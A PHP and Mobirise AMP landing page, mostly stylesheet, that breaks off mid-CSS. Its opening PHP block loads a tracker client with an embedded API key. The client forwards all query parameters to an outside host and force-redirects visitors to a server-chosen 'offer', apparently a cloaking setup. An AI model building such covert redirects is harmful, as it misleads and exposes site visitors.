<?php
// Query params are: fb={{fb}} 

require_once dirname(__FILE__) . '/kclient.php';
$client = new KClient('https://bariup.site/api.php?', 'v6qhbvrcpfcq5sxxj8vkdch8q5md9vv4');
$client->sendAllParams();       // to send all params from page query
$client->forceRedirectOffer();       // redirect to offer if an offer is chosen
// $client->param('sub_id_5', '123'); // you can send any params
// $client->keyword('PASTE_KEYWORD');  // send custom keyword
// $client->currentPageAsReferrer(); // to send current page URL as click referrer
// $client->debug();              // to enable debug mode and show the errors
// $client->execute();             // request to api, show the output and continue
$client->executeAndBreak();     // to stop page execution if there is redirect or some output
?>
<!DOCTYPE html>
<html amp >
<head>
  <!-- Site made with Mobirise Website Builder v4.12.3, https://mobirise.com -->
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="generator" content="Mobirise v4.12.3, mobirise.com">
  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
  <link rel="shortcut icon" href="assets/images/logo1.png" type="image/x-icon">
  <meta name="description" content="">
  <meta name="amp-script-src" content="">
  
  <title>Home</title>
  
<link rel="canonical" href="https://valentinleontev.github.io/">
 <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style>
<noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
<link href="https://fonts.googleapis.com/css?family=Roboto:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i&subset=cyrillic&display=swap" rel="stylesheet">
 
 <style amp-custom> 
div,span,h1,h2,h3,h4,h5,h6,p,blockquote,a,ol,ul,li,figcaption,textarea,input{font: inherit;}*{-webkit-box-sizing: border-box;box-sizing: border-box;outline: none;}*:focus{outline: none;}body{position: relative;font-style: normal;line-height: 1;color: #3f485d;}section{background-color: #eeeeee;background-position: 50% 50%;background-repeat: no-repeat;background-size: cover;overflow: hidden;padding: 30px 0;}h1,h2,h3,h4,h5,h6{margin: 0;padding: 0;}p,li,blockquote{letter-spacing: 0.5px;line-height: 1.7;}ul,ol,blockquote,p{margin-bottom: 0;margin-top: 0;}a{cursor: pointer;}a,a:hover{text-decoration: none;}a.mbr-iconfont:hover{text-decoration: none;}h1,h2,h3,h4,h5,h6,.display-1,.display-2,.display-4,.display-5,.display-7{word-break: break-word;word-wrap: break-word;}b,strong{font-weight: bold;}blockquote{padding: 10px 0 10px 20px;position: relative;border-left: 3px solid;}input:-webkit-autofill,input:-webkit-autofill:hover,input:-webkit-autofill:focus,input:-webkit-autofill:active{-webkit-transition-delay: 9999s;transition-delay: 9999s;-webkit-transition-property: background-color,color;-o-transition-property: background-color,color;transition-property: background-color,color;}html,body{height: auto;min-height: 100vh;}.mbr-section-title{margin: 0;padding: 0;font-style: normal;line-height: 1.2;width: 100%;}.mbr-section-subtitle{line-height: 1.3;width: 100%;}.mbr-text{font-style: normal;line-height: 1.6;width: 100%;}.mbr-white{color: #ffffff;}.mbr-black{color: #000000;}.align-left{text-align: left;}.align-left .list-item{justify-content: flex-start;}.align-center{text-align: center;}.align-center .list-item{justify-content: center;}.align-right{text-align: right;}.align-right .list-item{justify-content: flex-end;}@media (max-width: 767px){.align-left,.align-center,.align-right{text-align: center;}.align-left .list-item,.align-center .list-item,.align-right .list-item{justify-content: center;}}.mbr-light{font-weight: 300;}.mbr-regular{font-weight: 400;}.mbr-semibold{font-weight: 500;}.mbr-bold{font-weight: 700;}.icons-list a{margin: 0 1rem 0 0;}.icons-list a:last-child{margin: 0;}.mbr-figure{align-self: center;}.hidden{visibility: hidden;}.super-hide{display: none;}.inactive{-webkit-user-select: none;-moz-user-select: none;-ms-user-select: none;user-select: none;pointer-events: none;-webkit-user-drag: none;user-drag: none;}.mbr-overlay{position: absolute;bottom: 0;left: 0;right: 0;top: 0;z-index: 0;}.map-placeholder{display: none;}.google-map,.google-map iframe{position: relative;width: 100%;height: 400px;}amp-img{width: 100%;}amp-img img{max-height: 100%;max-width: 100%;}img.mbr-temp{width: 100%;}.rounded{border-radius: 50%;}.is-builder .nodisplay + img[async],.is-builder .nodisplay + img[decoding="async"],.is-builder amp-img > a + img[async],.is-builder amp-img > a + img[decoding="async"]{display: none;}html:not(.is-builder) amp-img > a{position: absolute;top: 0;bottom: 0;left: 0;right: 0;z-index: 1;}.is-builder .temp-amp-sizer{position: absolute;}.is-builder amp-youtube .temp-amp-sizer,.is-builder amp-vimeo .temp-amp-sizer{position: static;}.mobirise-spinner{position: absolute;top: 50%;left: 40%;margin-left: 10%;-webkit-transform: translate3d(-50%,-50%,0);z-index: 4;}.mobirise-spinner em{width: 24px;height: 24px;background: #3ac;border-radius: 100%;display: inline-block;-webkit-animation: slide 1s infinite;}.mobirise-spinner em:nth-child(1){-webkit-animation-delay: 0.1s;}.mobirise-spinner em:nth-child(2){-webkit-animation-delay: 0.2s;}.mobirise-spinner em:nth-child(3){-webkit-animation-delay: 0.3s;}@-moz-keyframes slide{0%{-webkit-transform: scale(1);}50%{opacity: 0.3;-webkit-transform: scale(2);}100%{-webkit-transform: scale(1);}}@-webkit-keyframes slide{0%{-webkit-transform: scale(1);}50%{opacity: 0.3;-webkit-transform: scale(2);}100%{-webkit-transform: scale(1);}}@-o-keyframes slide{0%{-webkit-transform: scale(1);}50%{opacity: 0.3;-webkit-transform: scale(2);}100%{-webkit-transform: scale(1);}}@keyframes slide{0%{-webkit-transform: scale(1);}50%{opacity: 0.3;-webkit-transform: scale(2);}100%{-webkit-transform: scale(1);}}.mobirise-loader .amp-active > div{display: none;}.mbr-flex{display: flex;}.flex-wrap{flex-wrap: wrap;}.mbr-jc-s{justify-content: flex-start;}.mbr-jc-c{justify-content: center;}.mbr-jc-e{justify-content: flex-end;}.mbr-row-reverse{flex-direction: row-reverse;}.mbr-column{flex-direction: column;}amp-img,img{height: 100%;width: 100%;}.hidden-slide{display: none;}.visible-slide{display: flex;}.iconfont-wrapper{display: inline-block;}section,.container,.container-fluid{position: relative;word-wrap: break-word;}.mbr-fullscreen .mbr-overlay{min-height: 100vh;}.mbr-fullscreen{display: flex;align-items: center;height: 100vh;min-height: 100vh;padding: 3rem 0;}.container{padding: 0 1rem;width: 100%;margin-right: auto;margin-left: auto;}@media (max-width: 767px){.container{max-width: 540px;}} @media (min-width: 768px){.container{max-width: 720px;}} @media (min-width: 992px){.container{max-width: 960px;}} @media (min-width: 1200px){.container{max-width: 1140px;}}.container-fluid{width: 100%;padding: 0 1rem;}.btn{position: relative;font-weight: 400;margin: 0.4rem 0.5rem;border: 2px solid;font-style: normal;white-space: normal;transition: all 0.3s ease-in-out,box-shadow 2s ease-in-out,-webkit-box-shadow 2s ease-in-out;display: inline-flex;align-items: center;justify-content: center;word-break: break-word;line-height: 1;letter-spacing: 2px;}.btn-form{padding: 1rem 2rem;}.btn-form:hover{cursor: pointer;}.btn{padding: 1rem 2rem;border-radius: 0px;}.btn-sm{padding: 0.6rem 0.8rem;border-radius: 0px;}.btn-md{padding: 1rem 2rem;border-radius: 0px;}.btn-lg{padding: 1.2rem 3.2rem;border-radius: 0px;}form .btn,form .mbr-section-btn{margin: 0;}.note-popover .btn:after{display: none;}.mbr-section-btn{margin: 0 -0.25rem;font-size: 0;}nav .mbr-section-btn{margin-left: 0rem;margin-right: 0rem;}.btn .mbr-iconfont,.btn.btn-md .mbr-iconfont{cursor: pointer;margin: 0 0.8rem 0 0;}.btn-sm .mbr-iconfont{margin: 0 0.5rem 0 0;}[type="submit"]{-webkit-appearance: none;}section.menu{min-height: 70px;}.menu-container{display: flex;-webkit-box-pack: justify;-ms-flex-pack: justify;justify-content: space-between;align-items: center;min-height: 70px;}@media (max-width: 991px){.menu-container{max-width: 100%;padding: 0.5rem 1rem;}} @media (max-width: 767px){.menu-container{padding: 0.5rem 1rem;}}.navbar{z-index: 100;width: 100%;}.navbar-fixed-top{position: fixed;top: 0;}.navbar-brand{display: flex;align-items: center;word-break: break-word;z-index: 1;}.navbar-logo{margin: 0 0.8rem 0 0;}@media (max-width: 767px){.navbar-logo amp-img{max-height: 35px;max-width: 35px;}}.navbar-caption-wrap{display: flex;}.navbar .navbar-collapse{display: flex;-ms-flex-preferred-size: auto;flex-basis: auto;align-items: center;justify-content: flex-end;}@media (max-width: 991px){.navbar .navbar-collapse{display: none;position: absolute;top: 0;right: 0;height: 100vh;padding: 70px 2rem 1rem;z-index: 1;}}@media (max-width: 991px){.navbar.opened .navbar-collapse.show,.navbar.opened .navbar-collapse.collapsing{display: block;}.is-builder .navbar-collapse{position: fixed;}}.navbar-nav{list-style-type: none;display: flex;flex-wrap: wrap;padding-left: 0;min-width: 10rem;}@media (max-width: 991px){.navbar-nav{flex-direction: column;}} .navbar-nav .mbr-iconfont{margin: 0 0.2rem 0 0;}.nav-item{word-break: break-all;}.nav-link{display: flex;align-items: center;justify-content: center;}.nav-link,.navbar-caption{transition: all 0.2s;letter-spacing: 1px;}.nav-dropdown .dropdown-menu{min-width: 10rem;position: absolute;left: 0;padding: 1.25rem 0;}.nav-dropdown .dropdown-menu .dropdown-item{line-height: 2;display: flex;justify-content: center;align-items: center;padding: 0.25rem 1.5rem;white-space: nowrap;}.nav-dropdown .dropdown-menu .dropdown{position: relative;}.dropdown-menu .dropdown:hover > .dropdown-menu{opacity: 1;pointer-events: all;}.nav-dropdown .dropdown-submenu{top: 0;left: 100%;margin: 0;}.nav-item.dropdown{position: relative;}.nav-item.dropdown .dropdown-menu{opacity: 0;pointer-events: none;}.nav-item.dropdown:hover > .dropdown-menu{opacity: 1;pointer-events: all;}.link.dropdown-toggle:after{content: "";margin-left: 0.25rem;border-top: 0.35em solid;border-right: 0.35em solid transparent;border-left: 0.35em solid transparent;border-bottom: 0;}.navbar .dropdown.open > .dropdown-menu{display: block;}@media (max-width: 991px){.is-builder .nav-dropdown .dropdown-menu{position: relative;}.nav-dropdown .dropdown-submenu{left: 0;}.nav-dropdown .dropdown-menu .dropdown-item{padding: 0.25rem 1.5rem;margin: 0;justify-content: center;}.nav-dropdown .dropdown-menu .dropdown-item:after{right: auto;}.navbar.opened .dropdown-menu{top: 0;}.dropdown-toggle[data-toggle="dropdown-submenu"]:after{content: "";margin-left: 0.25rem;border-top: 0.35em solid;border-right: 0.35em solid transparent;border-left: 0.35em solid transparent;border-bottom: 0;top: 55%;}}.navbar-buttons{display: flex;flex-wrap: wrap;align-items: center;justify-content: center;}@media (max-width: 991px){.navbar-buttons{flex-direction: column;}}.menu-social-list{display: flex;align-items: center;justify-content: center;flex-wrap: wrap;}.menu-social-list a{margin: 0 0.5rem;}.menu-social-list a span{font-size: 1.5rem;}button.navbar-toggler{position: absolute;right: 20px;top: 25px;width: 31px;height: 20px;cursor: pointer;transition: all .2s;-ms-flex-item-align: center;-ms-grid-row-align: center;align-self: center;}.hamburger span{position: absolute;right: 0;width: 30px;height: 2px;border-right: 5px;}.hamburger span:nth-child(1){top: 0;transition: all .2s;}.hamburger span:nth-child(2){top: 8px;transition: all .15s;}.hamburger span:nth-child(3){top: 8px;transition: all .15s;}.hamburger span:nth-child(4){top: 16px;transition: all .2s;}nav.opened .navbar-toggler:not(.hide) .hamburger span:nth-child(4),nav.opened .navbar-toggler:not(.hide) .hamburger span:nth-child(1){top: 8px;width: 0;opacity: 0;right: 50%;transition: all .2s;}nav.opened .navbar-toggler:not(.hide) .hamburger span:nth-child(2){transform: rotate(-45deg);transition: all .25s;}nav.opened .navbar-toggler:not(.hide) .hamburger span:nth-child(3){transform: rotate(45deg);transition: all .25s;}.ampstart-btn.hamburger{position: absolute;top: 25px;right: 20px;margin-left: auto;height: 20px;width: 30px;background: none;border: none;cursor: pointer;z-index: 1000;}@media (min-width: 992px){.ampstart-btn,amp-sidebar{display: none;}.dropdown-menu .dropdown-toggle:after{content: "";border-bottom: 0.35em solid transparent;border-left: 0.35em solid;border-right: 0;border-top: 0.35em solid transparent;margin-left: 0.3rem;margin-top: -0.3077em;position: absolute;right: 1.1538em;top: 50%;}}.close-sidebar{width: 30px;height: 30px;position: relative;cursor: pointer;background-color: transparent;border: none;}.close-sidebar span{position: absolute;left: 0;width: 30px;height: 2px;border-right: 5px;top: 14px;}.close-sidebar span:nth-child(1){transform: rotate(-45deg);}.close-sidebar span:nth-child(2){transform: rotate(45deg);}.builder-sidebar{position: relative;height: 100vh;min-width: 10rem;z-index: 1030;padding: 1rem 2rem;max-width: 20rem;}.builder-sidebar .dropdown:hover > .dropdown-menu{position: relative;text-align: center;}section.sidebar-open:before{content: '';position: fixed;top: 0;bottom: 0;right: 0;left: 0;background-color: rgba(0,0,0,0.2);z-index: 1040;}.is-builder section.horizontal-menu .ampstart-btn{display: none;}.is-builder section.horizontal-menu .dropdown-menu{z-index: auto;opacity: 1;pointer-events: auto;}.is-builder .menu{overflow: visible;}#sidebar{background-color: transparent;}.card-title{margin: 0;}.card{position: relative;background-color: transparent;border: none;border-radius: 0;width: 100%;padding: 0 1rem;}@media (max-width: 767px){.card:not(.last-child){padding-bottom: 30px;}} .card .card-img{width: auto;border-radius: 0;}.card .card-wrapper{height: 100%;}@media (max-width: 767px){.card .card-wrapper{flex-direction: column;}} .card img{height: 100%;-o-object-fit: cover;object-fit: cover;-o-object-position: center;object-position: center;}.card-inner,.items-list{display: flex;flex-direction: column;}.items-list{list-style-type: none;padding: 0;}.items-list .list-item{padding: 1rem 2rem;}.card-head{padding: 1.5rem 2rem;}.card-price-wrap{padding: 1rem 2rem;}.card-button{padding: 1rem;margin: 0;}.timeline-wrap{position: relative;}.timeline-wrap .iconBackground{position: absolute;left: 50%;width: 20px;height: 20px;line-height: 30px;text-align: center;border-radius: 50%;font-size: 30px;display: inline-block;background-color: #000000;top: 20px;margin: 0 0 0 -10px;}@media (max-width: 767px){.timeline-wrap .iconBackground{left: 0;}}.separline{position: relative;}@media (max-width: 767px){.separline:not(.last-child){padding-bottom: 2rem;}} .separline:before{position: absolute;content: "";width: 2px;background-color: #000000;left: calc(50% - 1px);height: calc(100% - 20px);top: 40px;}@media (max-width: 767px){.separline:before{left: 0;}}.gallery-img-wrap{position: relative;height: 100%;}.gallery-img-wrap:hover{cursor: pointer;}.gallery-img-wrap:hover .icon-wrap,.gallery-img-wrap:hover .caption-on-hover{opacity: 1;}.gallery-img-wrap:hover:after{opacity: .5;}.gallery-img-wrap amp-img{height: 100%;}.gallery-img-wrap:after{content: "";position: absolute;top: 0;bottom: 0;left: 0;right: 0;background: #000;opacity: 0;transition: opacity 0.2s;pointer-events: none;}.gallery-img-wrap .icon-wrap,.gallery-img-wrap .img-caption{z-index: 3;pointer-events: none;position: absolute;}.gallery-img-wrap .icon-wrap,.gallery-img-wrap .caption-on-hover{opacity: 0;transition: opacity 0.2s;}.gallery-img-wrap .icon-wrap{left: 50%;top: 50%;transform: translate(-50%,-50%);background-color: #fff;padding: .5rem;border-radius: 50%;}.gallery-img-wrap .amp-iconfont{color: #000;font-size: 1rem;width: 1rem;display: block;}.gallery-img-wrap .img-caption{left: 0;right: 0;}.gallery-img-wrap .img-caption.caption-top{top: 0;}.gallery-img-wrap .img-caption.caption-bottom{bottom: 0;}.gallery-img-wrap .img-caption:not(.caption-on-hover):after{content: "";position: absolute;top: 0;left: 0;right: 0;height: 100%;transition: opacity 0.2s;z-index: -1;pointer-events: none;}@media (max-width: 767px){.gallery-img-wrap:after,.gallery-img-wrap:hover:after,.gallery-img-wrap .icon-wrap{display: none;}.gallery-img-wrap .caption-on-hover{opacity: 1;}}.is-builder .gallery-img-wrap .icon-wrap,.is-builder .gallery-img-wrap .img-caption > *{pointer-events: all;}.amp-carousel-button,.dots-wrapper .dots span{transition: all 0.4s;cursor: pointer;outline: none;}.amp-carousel-button{width: 50px;height: 50px;border-radius: 50%;}.dots-wrapper .dots{display: inline-block;margin: 4px 8px;}.dots-wrapper .dots span{display: block;border-radius: 12px;height: 24px;width: 24px;background-color: #ffffff;border: 10px solid #cccccc;opacity: 0.5;}.dots-wrapper .dots span.current{width: 40px;}.dots-wrapper .dots span:hover,.dots-wrapper .dots span.current{opacity: 1;}.amp-carousel-button-next:after{right: 1rem;}.amp-carousel-button-prev:after{left: 1rem;}button.btn-img{cursor: pointer;}.is-builder .preview button.btn-img{opacity: 0.5;position: relative;pointer-events: none;}amp-image-lightbox,.lightbox{background: rgba(0,0,0,0.8);display: flex;flex-wrap: wrap;align-items: center;justify-content: center;width: 100%;height: 100%;overflow: auto;}amp-image-lightbox a.control,.lightbox a.control{position: absolute;cursor: default;top: 0;right: 0;}amp-image-lightbox .close,.lightbox .close{background: none;border: none;position: absolute;top: 16px;right: 16px;height: 32px;width: 32px;cursor: pointer;z-index: 1000;}amp-image-lightbox .close:before,amp-image-lightbox .close:after,.lightbox .close:before,.lightbox .close:after{position: absolute;top: 0;right: 16px;content: ' ';height: 32px;width: 2px;background-color: #fff;}amp-image-lightbox .close:before,.lightbox .close:before{transform: rotate(45deg);}amp-image-lightbox .close:after,.lightbox .close:after{transform: rotate(-45deg);}amp-image-lightbox .video-block,.lightbox .video-block{width: 100%;}div[submit-success] > *,div[submit-error] > *{padding: 15px;margin-bottom: 1rem;}.form-block{z-index: 1;background-color: transparent;padding: 30px;position: relative;overflow: hidden;}.form-block .mbr-overlay{z-index: -1;}@media (max-width: 991px){.form-block{padding: 15px;}}form input,form textarea,form select{padding: 15px 0.5rem;line-height: 1.45;width: 100%;background: #ffffff;border-width: 1px;border-style: solid;border-color: #767676;border-radius: 0;color: #000000;}form input[type="checkbox"],form input[type="radio"]{border: none;background: none;width: auto;}form .field{padding-bottom: 0.5rem;padding-top: 0.5rem;}form textarea.field-input{height: 200px;}form .fieldset{display: flex;justify-content: center;flex-wrap: wrap;align-items: center;}textarea[type="hidden"]{display: none;}.form-check{margin-bottom: 0;}.form-check-label{padding-left: 0;}.form-check-input{position: relative;margin: 4px;}.form-check-inline{display: inline-flex;align-items: center;padding-left: 0;margin-right: .75rem;}.mbr-row,.mbr-form-row{display: -webkit-box;display: -ms-flexbox;display: flex;-ms-flex-wrap: wrap;flex-wrap: wrap;margin-left: -1rem;margin-right: -1rem;}.mbr-form-row{margin-left: -0.5rem;margin-right: -0.5rem;}.mbr-form-row > [class*="mbr-col"]{padding-left: 0.5rem;padding-right: 0.5rem;}@media (max-width: 767px){.mbr-col,.mbr-col-auto{padding-right: 1rem;padding-left: 1rem;}.mbr-col-sm-12{-ms-flex: 0 0 100%;-webkit-box-flex: 0;flex: 0 0 100%;max-width: 100%;padding-right: 1rem;padding-left: 1rem;}}@media (min-width: 768px){.mbr-col,.mbr-col-auto{padding-right: 1rem;padding-left: 1rem;}.mbr-col-md-2{-ms-flex: 0 0 16.6666666667%;-webkit-box-flex: 0;flex: 0 0 16.6666666667%;max-width: 16.6666666667%;padding-right: 1rem;padding-left: 1rem;}.mbr-col-md-3{-ms-flex: 0 0 25%;-webkit-box-flex: 0;flex: 0 0 25%;max-width: 25%;padding-right: 1rem;padding-left: 1rem;}.mbr-col-md-4{-ms-flex: 0 0 33.3333333333%;-webkit-box-flex: 0;flex: 0 0 33.3333333333%;max-width: 33.3333333333%;padding-right: 1rem;padding-left: 1rem;}.mbr-col-md-5{-ms-flex: 0 0 41.6666666667%;-webkit-box-flex: 0;flex: 0 0 41.6666666667%;max-width: 41.6666666667%;padding-right: 1rem;padding-left: 1rem;}.mbr-col-md-6{-ms-flex: 0 0 50%;-webkit-box-flex: 0;flex: 0 0 50%;max-width: 50%;padding-right: 1rem;padding-left: 1rem;}.mbr-col-md-7{-ms-flex: 0 0 58.3333333333%;-webkit-box-flex: 0;flex: 0 0 58.3333333333%;max-width: 58.3333333333%;padding-right: 1rem;padding-left: 1rem;}.mbr-col-md-8{-ms-flex: 0 0 66.6666666667%;-webkit-box-flex: 0;flex: 0 0 66.6666666667%;max-width: 66.6666666667%;padding-right: 1rem;padding-left: 1rem;}.mbr-col-md-10{-ms-flex: 0 0 83.3333333333%;-webkit-box-flex: 0;flex: 0 0 83.3333333333%;max-width: 83.3333333333%;padding-right: 1rem;padding-left: 1rem;}.mbr-col-md-12{-ms-flex: 0 0 100%;-webkit-box-flex: 0;flex: 0 0 100%;max-width: 100%;padding-right: 1rem;padding-left: 1rem;}}.mbr-col{-ms-flex: 1 1 auto;-webkit-box-flex: 1;flex: 1 1 auto;max-width: 100%;}.mbr-col-auto{-ms-flex: 0 0 auto;flex: 0 0 auto;width: auto;}@media (min-width: 992px){.mbr-col,.mbr-col-auto{padding-right: 1rem;padding-left: 1rem;}.mbr-col-lg-2{-ms-flex: 0 0 16.6666666667%;-webkit-box-flex: 0;flex: 0 0 16.6666666667%;max-width: 16.6666666667%;padding-right: 1rem;padding-left: 1rem;}.mbr-col-lg-3{-ms-flex: 0 0 25%;-webkit-box-flex: 0;flex: 0 0 25%;max-width: 25%;padding-right: 1rem;padding-left: 1rem;}.mbr-col-lg-4{-ms-flex: 0 0 33.3333333333%;-webkit-box-flex: 0;flex: 0 0 33.3333333333%;max-width: 33.3333333333%;padding-right: 1rem;padding-left: 1rem;}.mbr-col-lg-5{-ms-flex: 0 0 41.6666666667%;-webkit-box-flex: 0;flex: 0 0 41.6666666667%;max-width: 41.6666666667%;padding-right: 1rem;padding-left: 1rem;}.mbr-col-lg-6{-ms-flex: 0 0 50%;-webkit-box-flex: 0;flex: 0 0 50%;max-width: 50%;padding-right: 1rem;padding-left: 1rem;}.mbr-col-lg-7{-ms-flex: 0 0 58.3333333333%;-webkit-box-flex: 0;flex: 0 0 58.3333333333%;max-width: 58.3333333333%;padding-right: 1rem;padding-left: 1rem;}.mbr-col-lg-8{-ms-flex: 0 0 66.6666666667%;-webkit-box-flex: 0;flex: 0 0 66.6666666667%;max-width: 66.6666666667%;padding-right: 1rem;padding-left: 1rem;}.mbr-col-lg-9{-ms-flex: 0 0 75%;-webkit-box-flex: 0;flex: 0 0 75%;max-width: 75%;padding-right: 1rem;padding-left: 1rem;}.mbr-col-lg-10{-ms-flex: 0 0 83.3333333333%;-webkit-box-flex: 0;flex: 0 0 83.3333333333%;max-width: 83.3333333333%;padding-right: 1rem;padding-left: 1rem;}.mbr-col-lg-12{-ms-flex: 0 0 100%;-webkit-box-flex: 0;flex: 0 0 100%;max-width: 100%;padding-right: 1rem;padding-left: 1rem;}}@media (min-width: 992px){.lg-pb{padding-bottom: 3rem;}}@media (max-width: 991px){.md-pb{padding-bottom: 3rem;}}.mbr-pt-1,.mbr-py-1{padding-top: 10px;}.mbr-pb-1,.mbr-py-1{padding-bottom: 10px;}.mbr-px-1{padding-left: 10px;padding-right: 10px;}.mbr-p-1{padding: 10px;}.mbr-pt-2,.mbr-py-2{padding-top: 1rem;}.mbr-pb-2,.mbr-py-2{padding-bottom: 1rem;}.mbr-px-2{padding-left: 1rem;padding-right: 1rem;}.mbr-p-2{padding: 1rem;}.mbr-pt-3,.mbr-py-3{padding-top: 25px;}.mbr-pb-3,.mbr-py-3{padding-bottom: 25px;}.mbr-px-3{padding-left: 25px;padding-right: 25px;}.mbr-p-3{padding: 25px;}.mbr-pt-4,.mbr-py-4{padding-top: 2rem;}.mbr-pb-4,.mbr-py-4{padding-bottom: 2rem;}.mbr-px-4{padding-left: 2rem;padding-right: 2rem;}.mbr-p-4{padding: 2rem;}.mbr-pt-5,.mbr-py-5{padding-top: 3rem;}.mbr-pb-5,.mbr-py-5{padding-bottom: 3rem;}.mbr-px-5{padding-left: 3rem;padding-right: 3rem;}.mbr-p-5{padding: 3rem;}@media (max-width: 991px){.mbr-py-4,.mbr-py-5{padding-top: 1rem;padding-bottom: 1rem;}.mbr-px-4,.mbr-px-5{padding-left: 1rem;padding-right: 1rem;}.mbr-p-3,.mbr-p-4,.mbr-p-5{padding: 1rem;}}.mbr-ml-auto{margin-left: auto;}.mbr-mr-auto{margin-right: auto;}.mbr-m-auto{margin: auto;}#scrollToTopMarker{position: absolute;width: 0px;height: 0px;top: 300px;}#scrollToTopButton{position: fixed;bottom: 25px;right: 25px;opacity: .4;z-index: 5000;font-size: 32px;height: 60px;width: 60px;border: none;border-radius: 3px;cursor: pointer;}#scrollToTopButton:focus{outline: none;}#scrollToTopButton a:before{content: '';position: absolute;height: 40%;top: 36%;width: 2px;left: calc(50% - 1px);}#scrollToTopButton a:after{content: '';position: absolute;border-top: 2px solid;border-right: 2px solid;width: 40%;height: 40%;left: calc(30% - 1px);bottom: 30%;transform: rotate(-45deg);}.is-builder #scrollToTopButton a:after{left: 30%;}a{font-style: normal;font-weight: 400;}@media (max-width: 767px){.mbr-section-btn,.mbr-section-title{text-align: center;}}
body{font-family: Roboto;}blockquote{border-color: #4ea2e3;}div[submit-success] > *{background: #0dcd7b;color: #000000;}div[submit-error] > *{background: #a0a0a0;color: #ffffff;}.display-1{font-family: 'Roboto',sans-serif;font-size: 4.5rem;}.display-2{font-family: 'Roboto',sans-serif;font-size: 2.2rem;}.display-4{font-family: 'Roboto',sans-serif;font-size: 0.9rem;}.display-5{font-family: 'Roboto',sans-serif;font-size: 1.8rem;}.display-7{font-family: 'Roboto',sans-serif;font-size: 1.1rem;}.display-1 .mbr-iconfont-btn{font-size: 4.5rem;width: 4.5rem;}.display-2 .mbr-iconfont-btn{font-size: 2.2rem;width: 2.2rem;}.display-4 .mbr-iconfont-btn{font-size: 0.9rem;width: 0.9rem;}.display-5 .mbr-iconfont-btn{font-size: 1.8rem;width: 1.8rem;}.display-7 .mbr-iconfont-btn{font-size: 1.1rem;width: 1.1rem;}@media (max-width: 768px){.display-1{font-size: 3.6rem;font-size: calc( 2.225rem + (4.5 - 2.225) * ((100vw - 20rem) / (48 - 20)));line-height: calc( 1.4 * (2.225rem + (4.5 - 2.225) * ((100vw - 20rem) / (48 - 20))));}.display-2{font-size: 1.76rem;font-size: calc( 1.42rem + (2.2 - 1.42) * ((100vw - 20rem) / (48 - 20)));line-height: calc( 1.4 * (1.42rem + (2.2 - 1.42) * ((100vw - 20rem) / (48 - 20))));}.display-4{font-size: 0.72rem;font-size: calc( 0.965rem + (0.9 - 0.965) * ((100vw - 20rem) / (48 - 20)));line-height: calc( 1.4 * (0.965rem + (0.9 - 0.965) * ((100vw - 20rem) / (48 - 20))));}.display-5{font-size: 1.44rem;font-size: calc( 1.28rem + (1.8 - 1.28) * ((100vw - 20rem) / (48 - 20)));line-height: calc( 1.4 * (1.28rem + (1.8 - 1.28) * ((100vw - 20rem) / (48 - 20))));}}.bg-primary{background-color: #4ea2e3;}.bg-success{background-color: #0dcd7b;}.bg-info{background-color: #8282e7;}.bg-warning{background-color: #767676;}.bg-danger{background-color: #a0a0a0;}.btn-primary,.btn-primary:active,.btn-primary.active{background-color: #4ea2e3;border-color: #4ea2e3;color: #ffffff;}.btn-primary:hover,.btn-primary:focus,.btn-primary.focus{color: #ffffff;background-color: #1f7dc5;border-color: #1f7dc5;}.btn-primary.disabled,.btn-primary:disabled{color: #ffffff;background-color: #1f7dc5;border-color: #1f7dc5;}.btn-secondary,.btn-secondary:active,.btn-secondary.active{background-color: #4addff;border-color: #4addff;color: #003c4a;}.btn-secondary:hover,.btn-secondary:focus,.btn-secondary.focus{color: #003c4a;background-color: #00cdfd;border-color: #00cdfd;}.btn-secondary.disabled,.btn-secondary:disabled{color: #003c4a;background-color: #00cdfd;border-color: #00cdfd;}.btn-info,.btn-info:active,.btn-info.active{background-color: #8282e7;border-color: #8282e7;color: #ffffff;}.btn-info:hover,.btn-info:focus,.btn-info.focus{color: #ffffff;background-color: #4242db;border-color: #4242db;}.btn-info.disabled,.btn-info:disabled{color: #ffffff;background-color: #4242db;border-color: #4242db;}.btn-success,.btn-success:active,.btn-success.active{background-color: #0dcd7b;border-color: #0dcd7b;color: #ffffff;}.btn-success:hover,.btn-success:focus,.btn-success.focus{color: #ffffff;background-color: #088550;border-color: #088550;}.btn-success.disabled,.btn-success:disabled{color: #ffffff;background-color: #088550;border-color: #088550;}.btn-warning,.btn-warning:active,.btn-warning.active{background-color: #767676;border-color: #767676;color: #ffffff;}.btn-warning:hover,.btn-warning:focus,.btn-warning.focus{color: #ffffff;background-color: #505050;border-color: #505050;}.btn-warning.disabled,.btn-warning:disabled{color: #ffffff;background-color: #505050;border-color: #505050;}.btn-danger,.btn-danger:active,.btn-danger.active{background-color: #a0a0a0;border-color: #a0a0a0;color: #ffffff;}.btn-danger:hover,.btn-danger:focus,.btn-danger.focus{color: #ffffff;background-color: #7a7a7a;border-color: #7a7a7a;}.btn-danger.disabled,.btn-danger:disabled{color: #ffffff;background-color: #7a7a7a;border-color: #7a7a7a;}.btn-black,.btn-black:active,.btn-black.active{background-color: #333333;border-color: #333333;color: #ffffff;}.btn-black:hover,.btn-black:focus,.btn-black.focus{color: #ffffff;background-color: #0d0d0d;border-color: #0d0d0d;}.btn-black.disabled,.btn-black:disabled{color: #ffffff;background-color: #0d0d0d;border-color: #0d0d0d;}.btn-white,.btn-white:active,.btn-white.active{background-color: #ffffff;border-color: #ffffff;color: #808080;}.btn-white:hover,.btn-white:focus,.btn-white.focus{color: #808080;background-color: #d9d9d9;border-color: #d9d9d9;}.btn-white.disabled,.btn-white:disabled{color: #808080;background-color: #d9d9d9;border-color: #d9d9d9;}.btn-white,.btn-white:active,.btn-white.active{color: #333333;}.btn-white:hover,.btn-white:focus,.btn-white.focus{color: 